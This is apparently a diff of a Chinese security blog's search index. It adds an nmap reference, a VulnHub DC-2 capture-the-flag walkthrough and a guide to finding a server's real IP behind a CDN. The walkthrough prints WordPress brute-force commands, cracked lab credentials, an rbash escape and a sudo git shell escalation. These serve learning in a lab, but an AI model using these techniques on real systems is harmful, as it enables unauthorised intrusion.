+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-attr">[Scan Type(s)]</span> <span class="selector-attr">[Options]</span> &#123;<span class="selector-tag">target</span> <span class="selector-tag">specification</span>&#125;</span><br><span class="line"><span class="selector-tag">scan</span> <span class="selector-tag">type</span>(s) 用于指定扫描类型</span><br><span class="line"><span class="selector-tag">options</span> 用于指定选项</span><br><span class="line"><span class="selector-tag">target</span> <span class="selector-tag">specification</span> 用于指定扫描目标</span><br><span class="line"><span class="selector-tag">-s</span> 指定扫描类型</span><br><span class="line">如下：</span><br><span class="line"><span class="selector-tag">-sP</span> (ping扫描) *存活主机探测</span><br><span class="line"><span class="selector-tag">-sS</span> (TCP SYN扫描 隐身扫描) *默认扫描方式，使用频率最高的半开放扫描</span><br><span class="line"><span class="selector-tag">-sT</span> (tcp 扫描) *<span class="selector-tag">TCP</span> <span class="selector-tag">connect</span>()默认的扫描方式，完成三次握手</span><br><span class="line"><span class="selector-tag">-sU</span> （<span class="selector-tag">UDP</span> 扫描）用来探测目的的<span class="selector-tag">UDP</span>端口，不需要发送任何的<span class="selector-tag">SYN</span>包，发送<span class="selector-tag">UDP</span>数据包到目的主机等待响应</span><br><span class="line"><span class="selector-tag">-sA</span> （<span class="selector-tag">ACK</span>扫描） *三次握手 用于探测出防火墙过滤端口 实际渗透中没多大用</span><br><span class="line"><span class="selector-tag">-sV</span> （版本探测）</span><br><span class="line"><span class="selector-tag">-A</span>	综合扫描（系统探测，版本探测，路由追踪以及一些常用脚本的扫描）</span><br><span class="line"><span class="selector-tag">-O</span> （启用操作系统检测）</span><br><span class="line"><span class="selector-tag">-v</span>详细</span><br><span class="line">选项说明</span><br><span class="line"><span class="selector-tag">-P0</span> <span class="selector-attr">[指定端口]</span> (无ping扫描)</span><br><span class="line"><span class="selector-tag">-PU</span> <span class="selector-attr">[指定端口]</span> (udp ping扫描)</span><br><span class="line"><span class="selector-tag">-PS</span> <span class="selector-attr">[指定端口]</span> (TCP SYN ping 扫描)</span><br><span class="line"><span class="selector-tag">-PA</span> <span class="selector-attr">[指定端口]</span> (tcp ack ping扫描)</span><br><span class="line"><span class="selector-tag">-PI</span> 使用真正的<span class="selector-tag">pingICMP</span> <span class="selector-tag">echo</span>请求来扫描目标主机是否正在运行</span><br><span class="line"><span class="selector-tag">-iL</span> 指定扫描主机列表</span><br><span class="line"><span class="selector-tag">-iR</span> 随机选择目标</span><br><span class="line">–<span class="selector-tag">exclude</span> 排除扫描目标</span><br><span class="line">–<span class="selector-tag">excludefile</span> 排除文件中目标列表</span><br><span class="line"><span class="selector-tag">-n</span> (不用域名解析)</span><br><span class="line"><span class="selector-tag">-R</span> (为所有目标解析域名)</span><br><span class="line"><span class="selector-tag">-T</span> 时间优化（每隔多久发一次包 ） <span class="selector-tag">-T5</span> 最快 <span class="selector-tag">-T0</span> 最慢（<span class="selector-tag">5</span>适合局域网）</span><br><span class="line"><span class="selector-tag">-F</span> 快速扫描</span><br><span class="line"><span class="selector-tag">-e</span> 指定网络接口</span><br><span class="line"><span class="selector-tag">-M</span> 设置<span class="selector-tag">tcp</span>扫描线程</span><br><span class="line"><span class="selector-tag">-iL</span> 文件 指定一个文本内的所有主机</span><br><span class="line"><span class="selector-tag">nmap</span>的输出：<span class="selector-tag">oN</span>，<span class="selector-tag">oX</span>，<span class="selector-tag">oS</span>，<span class="selector-tag">oG</span>（结果为一般模式。<span class="selector-tag">XML</span>，<span class="selector-tag">kiddi3</span>，<span class="selector-tag">grepable</span>格式）</span><br><span class="line"><span class="selector-tag">nmap</span>输出 <span class="selector-tag">ip</span>：<span class="selector-tag">port</span> 格式：</span><br><span class="line">nmap -vv -p 80 192.168.1.0/24 | grep “Discovered open port” | awk &#123;‘print $6”:”$4’&#125; | awk -F/ &#123;‘print $1’&#125; &gt; output.txt</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>NMAP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VulnHub渗透之DC-2</title>
+    <url>/2020/07/08/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-2/</url>
+    <content><![CDATA[<h2 id="0×00-说明">0×00 说明</h2>
+<p><strong>知识点：WordPress、受限shell、git提权</strong></p>
+<blockquote>
+<p>kali：192.168.101.10<br>
+靶机和kali处于同一局域网</p>
+</blockquote>
+<h2 id="0x01-信息收集">0x01 信息收集</h2>
+<ol>
+<li>探测目标地址</li>
+</ol>
+<p>命令：<code>arp-scan -l</code> 或者 <code>nmap -sP 192.168.101.0/24</code></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708153613.png" alt=""></p>
+<p>靶机地址为192.168.101.17</p>
+<ol start="2">
+<li>探测目标开放端口</li>
+</ol>
+<p>命令：<code>nmap -sV -p- 192.168.101.17</code></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708154210.png" alt=""></p>
+<p>靶机开放了80端口和7744端口，7744为SSH，先访问下80</p>
+<blockquote>
+<p>ts：需要先修改hosts文件，kali上的hosts位置在 /etc/hosts</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708154819.png" alt=""></p>
+<h2 id="0x02-Flag1">0x02 Flag1</h2>
+<p>访问成功，使用wappalyzer查看下网站所使用的技术</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708155044.png" alt=""></p>
+<p>网站为 WordPress CMS构建，并且发现第一个flag</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708154934.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Flag 1:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</span><br><span class="line"></span><br><span class="line">More passwords is always better, but sometimes you just can’t win them all.</span><br><span class="line"></span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line"></span><br><span class="line">If you can’t find it, log in as another.</span><br></pre></td></tr></table></figure>
+<p>提示使用cewl工具，并且只有登陆之后才能看到下一个flag</p>
+<h2 id="0x03-Flag2">0x03 Flag2</h2>
+<p>cewl工具可以根据url来生成对应的密码字典<br>
+命令：<code>cewl -w /root/dic/dc2_passwd.txt http://dc-2/</code></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708161432.png" alt=""></p>
+<p>有了密码，接下来使用wpscan，它可以查询出wordpress的用户名，-e u是枚举用户名，默认从1-10<br>
+命令：<code>wpscan --url http://dc-2/ -e u</code></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708161924.png" alt=""></p>
+<p>接下来，找出 WordPress 登陆地址，可以网上查找或者工具去扫描<br>
+工具可以用dirb，命令：<code>dirb http://dc-2/</code></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708162403.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708165933.png" alt=""></p>
+<p>字典地址都具备了，使用wpscan进行爆破<br>
+命令：<code>wpscan --url http://dc-2/wp-admin -U /root/dic/dc2_username.txt -P /root/dic/dc2_passwd.txt</code></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708171549.png" alt=""></p>
+<p>爆破成功，结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: jerry, Password: adipiscing</span><br><span class="line"> | Username: tom, Password: parturient</span><br></pre></td></tr></table></figure>
+<p>使用 jerry 登陆，找到了flag2</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708171905.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line"></span><br><span class="line">If you can&#39;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure>
+<p>意思是，WordPress行不通就换个方式</p>
+<h2 id="0x04-Flag3">0x04 Flag3</h2>
+<p>于是想到之前还有个SSH服务，便尝试登陆，发现jerry无法登录，tom可以</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708172252.png" alt=""><br>
+<img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708172433.png" alt=""></p>
+<p><code>ls</code> 发现 <code>flag3.txt</code> 在当前目录下，但是使用 <code>cat</code> 却提示 <code>-rbash: cat: command not found</code></p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708172620.png" alt=""></p>
+<p>这是一个受限shell环境，常见的受限shell环境类型包括rbash、rksh和rsh，于是现在需要绕过rbash，<code>compgen</code>还能使用，查看下当前可以执行的命令<br>
+命令：<code>compgen -c</code></p>
+<blockquote>
+<p>受限shell是LinuxShell限制一些bash shell中的功能，并且是从名字上很清楚。 该限制很好地实现&gt; 了命令以及脚本在受限shell中运行。 它为Linux中的bash shell提供了一个额外的安全层。</p>
+</blockquote>
+<p>大概清楚了，查看当前环境变量：<code>echo $PATH</code>，发现位于<code>/home/tom/usr/bin</code>下，用<code>vi</code>转义受限制的shell：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi</span><br><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+<p>然后设置环境变量：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH&#x3D;&#x2F;bin:&#x2F;usr&#x2F;bin:$PATH</span><br><span class="line">export SHELL&#x3D;&#x2F;bin&#x2F;bash:$SHELL</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708173847.png" alt=""></p>
+<p>成功绕过rbash，并读取了flag3.txt的内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>
+<p>实际上，是要让我们切换 jerry 用户</p>
+<h2 id="0x05-Flag4">0x05 Flag4</h2>
+<p>使用<code>su jerry</code>切换 jerry 用户，回到jerry的家目录查看，发现了flag4</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708174603.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Good to see that you&#39;ve made it this far - but you&#39;re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#39;re on your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure>
+<p>告诉我们只差最后一个flag了，还提示了 <code>git</code></p>
+<h2 id="0x06-Flag5">0x06 Flag5</h2>
+<p>其实是使用<code>git</code>进行提权</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708175605.png" alt=""></p>
+<p>拿到最后的 flag .</p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>VulnHub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>绕过CDN寻找真实IP</title>
+    <url>/2020/06/23/%E7%BB%95%E8%BF%87CDN/</url>
+    <content><![CDATA[<blockquote>
+<p>目前很多站点出于用户体验和安全的角度，使用CDN加速，将域名解析到CDN，这时候就需要绕过CDN来查找真实IP。</p>
+</blockquote>
+<h2 id="一、DNS历史解析记录">一、DNS历史解析记录</h2>
+<p>查询域名的历史解析记录，找网站使用CDN前的解析记录，从而获取真实ip，相关查询的网站有：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">iphistory：https://viewdns.info/iphistory/</span><br><span class="line">DNS查询：（https://dnsdb.io/zh-cn/）</span><br><span class="line">微步在线：（https://x.threatbook.cn/）</span><br><span class="line">域名查询：（https://site.ip138.com/）</span><br><span class="line">DNS历史查询：（https://securitytrails.com/）</span><br><span class="line">Netcraft：https://sitereport.netcraft.com/?url=github.com</span><br></pre></td></tr></table></figure>
+<h2 id="二、子域名">二、子域名</h2>
+<p>很多时候，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。<br>
+常用的子域名查找方法和工具：</p>
+<ol>
+<li>搜索引擎查询：如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。</li>
+<li>在线查询网站：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;tool.chinaz.com&#x2F;subdomain&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;i.links.cn&#x2F;subdomain&#x2F;    </span><br><span class="line">http:&#x2F;&#x2F;subdomain.chaxun.la&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;searchdns.netcraft.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.virustotal.com&#x2F;</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>子域名爆破工具</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Layer子域名挖掘机</span><br><span class="line">wydomain：https:&#x2F;&#x2F;github.com&#x2F;ring04h&#x2F;wydomain    </span><br><span class="line">subDomainsBrute:https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;</span><br><span class="line">Sublist3r:https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r</span><br></pre></td></tr></table></figure>
+<h2 id="三、网站邮件头信息">三、网站邮件头信息</h2>
+<p>比如：邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200623112316.png" alt=""></p>
+<h2 id="四、网络空间安全引擎搜索">四、网络空间安全引擎搜索</h2>
+<p>通过关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">钟馗之眼：https:&#x2F;&#x2F;www.zoomeye.org</span><br><span class="line">Shodan：https:&#x2F;&#x2F;www.shodan.io</span><br><span class="line">Fofa：https:&#x2F;&#x2F;fofa.so</span><br></pre></td></tr></table></figure>
+<h2 id="五、利用SSL证书">五、利用SSL证书</h2>
+<p>证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。<br>
+SSL证书搜索引擎：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;censys.io&#x2F;ipv4?q&#x3D;github.com</span><br></pre></td></tr></table></figure>
+<h2 id="六、国外主机解析域名">六、国外主机解析域名</h2>
+<p>大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的DNS查询，很可能获取到真实IP。<br>
+国外多PING测试工具：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;asm.ca.com&#x2F;zh_cn&#x2F;ping.php</span><br><span class="line">http:&#x2F;&#x2F;host-tracker.com&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.webpagetest.org&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;dnscheck.pingdom.com&#x2F;</span><br></pre></td></tr></table></figure>
+<h2 id="七、全网扫描">七、全网扫描</h2>
+<p>通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP。</p>
+<ol>
+<li>ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zmap&#x2F;zmap</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan</span><br></pre></td></tr></table></figure>
+<h2 id="八、配置不当导致绕过">八、配置不当导致绕过</h2>
+<p>在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。</p>
+<ul>
+<li>案例1：为了方便用户访问，<a href="http://xn--www-ot9d021dl8ca199e.test.com" target="_blank" rel="noopener">我们常常将www.test.com</a> 和 <a href="http://test.com" target="_blank" rel="noopener">test.com</a> 解析到同一个站点，<a href="http://xn--CDNwww-5e8i318auw2h9jblx9h.test.com" target="_blank" rel="noopener">而CDN只配置了www.test.com</a>，<a href="http://xn--test-pr9lp7quqa868a.com" target="_blank" rel="noopener">通过访问test.com</a>，就可以绕过 CDN 了。</li>
+<li>案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>技巧</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>request库使用</title>
     <url>/2020/07/17/requests%E5%BA%93/</url>
     <content><![CDATA[<h2 id="构造请求">构造请求</h2>
@@ -772,117 +942,6 @@ Cadmus Computer Systems 表示Virtualbox虚拟机<br>
       </tags>
   </entry>
   <entry>
-    <title>NMAP的使用</title>
-    <url>/2020/06/27/Nmap%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="namp端口状态">namp端口状态</h2>
-<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">Open</span>(开放的): 应用程序正在这个端口上监听连接。</span><br><span class="line"><span class="selector-tag">losed</span>(关闭的): 端口对探测做出了响应，但是现在没有应用程序在监听这个端口。</span><br><span class="line"><span class="selector-tag">Filtered</span>(过滤的): 端口没有对探测做出响应。同时告诉我们探针可能被一些过滤器（防火墙）终止了。</span><br><span class="line"><span class="selector-tag">Unfiltered</span>(未被过滤的):端口对探测做出了响应，但是<span class="selector-tag">Nmap</span>无法确定它们是关闭还是开放。</span><br><span class="line"><span class="selector-tag">Open</span>/<span class="selector-tag">Filtered</span>: 端口被过滤或者是开放的，<span class="selector-tag">Nmap</span>无法做出判断。</span><br><span class="line"><span class="selector-tag">Closed</span>/<span class="selector-tag">Filtered</span>: 端口被过滤或者是关闭的，<span class="selector-tag">Nmap</span>无法做出判断。</span><br></pre></td></tr></table></figure>
-<h2 id="TCP标志位">TCP标志位</h2>
-<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">SYN</span>(synchronous建立联机)</span><br><span class="line"><span class="selector-tag">ACK</span>(acknowledgement 确认)</span><br><span class="line"><span class="selector-tag">PSH</span>(push传送)</span><br><span class="line"><span class="selector-tag">FIN</span>(finish结束)</span><br><span class="line"><span class="selector-tag">RST</span>(reset重置)</span><br><span class="line"><span class="selector-tag">URG</span>(urgent紧急)</span><br></pre></td></tr></table></figure>
-<h2 id="nmap常用命令">nmap常用命令</h2>
-<p>轻量级扫描：</p>
-<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sP</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.0</span>/<span class="selector-tag">24</span> 判断哪些主机存活</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sT</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.3</span> 开放了哪些端口</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sS</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.127</span> 开放了哪些端口（隐蔽扫描）</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sU</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.127</span> 开放了哪些端口（<span class="selector-tag">UDP</span>）</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sS</span> <span class="selector-tag">-O</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.127</span> 操作系统识别</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sT</span> <span class="selector-tag">-p</span> <span class="selector-tag">80</span> <span class="selector-tag">-oG</span> – <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.1</span>.* | <span class="selector-tag">grep</span> <span class="selector-tag">open</span>列出开放了指定端口的主机列表</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sV</span> <span class="selector-tag">-p</span> <span class="selector-tag">80</span> <span class="selector-tag">thief</span><span class="selector-class">.one</span> 列出服务器类型(列出操作系统，开发端口，服务器类型,网站脚本类型等)</span><br></pre></td></tr></table></figure>
-<p>批量扫描：</p>
-<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sT</span> <span class="selector-tag">-sV</span> <span class="selector-tag">-O</span> <span class="selector-tag">-P0</span> <span class="selector-tag">--open</span> <span class="selector-tag">-n</span> <span class="selector-tag">-oN</span> <span class="selector-tag">result</span><span class="selector-class">.txt</span> <span class="selector-tag">-p80-89</span>,<span class="selector-tag">8080-8099</span>,<span class="selector-tag">8000-8009</span>,<span class="selector-tag">7001-7009</span>,<span class="selector-tag">9000-9099</span>,<span class="selector-tag">21</span>,<span class="selector-tag">443</span>,<span class="selector-tag">873</span>,<span class="selector-tag">2601</span>,<span class="selector-tag">2604</span>,<span class="selector-tag">3128</span>,<span class="selector-tag">4440</span>,<span class="selector-tag">6082</span>,<span class="selector-tag">6379</span>,<span class="selector-tag">8888</span>,<span class="selector-tag">3389</span>,<span class="selector-tag">9200</span>,<span class="selector-tag">11211</span>,<span class="selector-tag">27017</span>,<span class="selector-tag">28017</span>,<span class="selector-tag">389</span>,<span class="selector-tag">8443</span>,<span class="selector-tag">4848</span>,<span class="selector-tag">8649</span>,<span class="selector-tag">995</span>,<span class="selector-tag">9440</span>,<span class="selector-tag">9871</span>,<span class="selector-tag">2222</span>,<span class="selector-tag">2082</span>,<span class="selector-tag">3311</span>,<span class="selector-tag">18100</span>,<span class="selector-tag">9956</span>,<span class="selector-tag">1433</span>,<span class="selector-tag">3306</span>,<span class="selector-tag">1900</span>,<span class="selector-tag">49705</span>,<span class="selector-tag">50030</span>,<span class="selector-tag">7778</span>,<span class="selector-tag">5432</span>,<span class="selector-tag">7080</span>,<span class="selector-tag">5900</span>,<span class="selector-tag">50070</span>,<span class="selector-tag">5000</span>,<span class="selector-tag">5560</span>,<span class="selector-tag">10000</span> <span class="selector-tag">-iL</span> <span class="selector-tag">ip</span><span class="selector-class">.txt</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sT</span> <span class="selector-tag">-sV</span> <span class="selector-tag">-p80-89</span>,<span class="selector-tag">8080-8099</span>,<span class="selector-tag">8000-8009</span>,<span class="selector-tag">7001-7009</span>,<span class="selector-tag">9000-9099</span>,<span class="selector-tag">21</span>,<span class="selector-tag">443</span>,<span class="selector-tag">873</span>,<span class="selector-tag">2601</span>,<span class="selector-tag">2604</span>,<span class="selector-tag">3128</span>,<span class="selector-tag">4440</span>,<span class="selector-tag">6082</span>,<span class="selector-tag">6379</span>,<span class="selector-tag">8888</span>,<span class="selector-tag">3389</span>,<span class="selector-tag">9200</span>,<span class="selector-tag">11211</span>,<span class="selector-tag">27017</span>,<span class="selector-tag">28017</span>,<span class="selector-tag">389</span>,<span class="selector-tag">8443</span>,<span class="selector-tag">4848</span>,<span class="selector-tag">8649</span>,<span class="selector-tag">995</span>,<span class="selector-tag">9440</span>,<span class="selector-tag">9871</span>,<span class="selector-tag">2222</span>,<span class="selector-tag">2082</span>,<span class="selector-tag">3311</span>,<span class="selector-tag">18100</span>,<span class="selector-tag">9956</span>,<span class="selector-tag">1433</span>,<span class="selector-tag">3306</span>,<span class="selector-tag">1900</span>,<span class="selector-tag">49705</span>,<span class="selector-tag">50030</span>,<span class="selector-tag">7778</span>,<span class="selector-tag">5432</span>,<span class="selector-tag">7080</span>,<span class="selector-tag">5900</span>,<span class="selector-tag">50070</span>,<span class="selector-tag">5000</span>,<span class="selector-tag">5560</span>,<span class="selector-tag">10000</span> <span class="selector-tag">--open</span> <span class="selector-tag">--max-hostgroup</span> <span class="selector-tag">10</span> <span class="selector-tag">--max-parallelism</span> <span class="selector-tag">10</span> <span class="selector-tag">--max-rtt-timeout</span> <span class="selector-tag">1000ms</span> <span class="selector-tag">--host-timeout</span> <span class="selector-tag">800s</span> <span class="selector-tag">--max-scan-delay</span> <span class="selector-tag">2000ms</span> <span class="selector-tag">-iL</span> ~/<span class="selector-tag">Desktop</span>/<span class="selector-tag">ip</span><span class="selector-class">.txt</span> <span class="selector-tag">-oN</span> ~/<span class="selector-tag">Desktop</span>/<span class="selector-tag">result</span>/<span class="selector-tag">result</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
-<h2 id="nmap参数">nmap参数</h2>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-attr">[Scan Type(s)]</span> <span class="selector-attr">[Options]</span> &#123;<span class="selector-tag">target</span> <span class="selector-tag">specification</span>&#125;</span><br><span class="line"><span class="selector-tag">scan</span> <span class="selector-tag">type</span>(s) 用于指定扫描类型</span><br><span class="line"><span class="selector-tag">options</span> 用于指定选项</span><br><span class="line"><span class="selector-tag">target</span> <span class="selector-tag">specification</span> 用于指定扫描目标</span><br><span class="line"><span class="selector-tag">-s</span> 指定扫描类型</span><br><span class="line">如下：</span><br><span class="line"><span class="selector-tag">-sP</span> (ping扫描) *存活主机探测</span><br><span class="line"><span class="selector-tag">-sS</span> (TCP SYN扫描 隐身扫描) *默认扫描方式，使用频率最高的半开放扫描</span><br><span class="line"><span class="selector-tag">-sT</span> (tcp 扫描) *<span class="selector-tag">TCP</span> <span class="selector-tag">connect</span>()默认的扫描方式，完成三次握手</span><br><span class="line"><span class="selector-tag">-sU</span> （<span class="selector-tag">UDP</span> 扫描）用来探测目的的<span class="selector-tag">UDP</span>端口，不需要发送任何的<span class="selector-tag">SYN</span>包，发送<span class="selector-tag">UDP</span>数据包到目的主机等待响应</span><br><span class="line"><span class="selector-tag">-sA</span> （<span class="selector-tag">ACK</span>扫描） *三次握手 用于探测出防火墙过滤端口 实际渗透中没多大用</span><br><span class="line"><span class="selector-tag">-sV</span> （版本探测）</span><br><span class="line"><span class="selector-tag">-A</span>	综合扫描（系统探测，版本探测，路由追踪以及一些常用脚本的扫描）</span><br><span class="line"><span class="selector-tag">-O</span> （启用操作系统检测）</span><br><span class="line"><span class="selector-tag">-v</span>详细</span><br><span class="line">选项说明</span><br><span class="line"><span class="selector-tag">-P0</span> <span class="selector-attr">[指定端口]</span> (无ping扫描)</span><br><span class="line"><span class="selector-tag">-PU</span> <span class="selector-attr">[指定端口]</span> (udp ping扫描)</span><br><span class="line"><span class="selector-tag">-PS</span> <span class="selector-attr">[指定端口]</span> (TCP SYN ping 扫描)</span><br><span class="line"><span class="selector-tag">-PA</span> <span class="selector-attr">[指定端口]</span> (tcp ack ping扫描)</span><br><span class="line"><span class="selector-tag">-PI</span> 使用真正的<span class="selector-tag">pingICMP</span> <span class="selector-tag">echo</span>请求来扫描目标主机是否正在运行</span><br><span class="line"><span class="selector-tag">-iL</span> 指定扫描主机列表</span><br><span class="line"><span class="selector-tag">-iR</span> 随机选择目标</span><br><span class="line">–<span class="selector-tag">exclude</span> 排除扫描目标</span><br><span class="line">–<span class="selector-tag">excludefile</span> 排除文件中目标列表</span><br><span class="line"><span class="selector-tag">-n</span> (不用域名解析)</span><br><span class="line"><span class="selector-tag">-R</span> (为所有目标解析域名)</span><br><span class="line"><span class="selector-tag">-T</span> 时间优化（每隔多久发一次包 ） <span class="selector-tag">-T5</span> 最快 <span class="selector-tag">-T0</span> 最慢（<span class="selector-tag">5</span>适合局域网）</span><br><span class="line"><span class="selector-tag">-F</span> 快速扫描</span><br><span class="line"><span class="selector-tag">-e</span> 指定网络接口</span><br><span class="line"><span class="selector-tag">-M</span> 设置<span class="selector-tag">tcp</span>扫描线程</span><br><span class="line"><span class="selector-tag">-iL</span> 文件 指定一个文本内的所有主机</span><br><span class="line"><span class="selector-tag">nmap</span>的输出：<span class="selector-tag">oN</span>，<span class="selector-tag">oX</span>，<span class="selector-tag">oS</span>，<span class="selector-tag">oG</span>（结果为一般模式。<span class="selector-tag">XML</span>，<span class="selector-tag">kiddi3</span>，<span class="selector-tag">grepable</span>格式）</span><br><span class="line"><span class="selector-tag">nmap</span>输出 <span class="selector-tag">ip</span>：<span class="selector-tag">port</span> 格式：</span><br><span class="line">nmap -vv -p 80 192.168.1.0/24 | grep “Discovered open port” | awk &#123;‘print $6”:”$4’&#125; | awk -F/ &#123;‘print $1’&#125; &gt; output.txt</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>NMAP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>VulnHub渗透之DC-2</title>
-    <url>/2020/07/08/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-2/</url>
-    <content><![CDATA[<h2 id="0×00-说明">0×00 说明</h2>
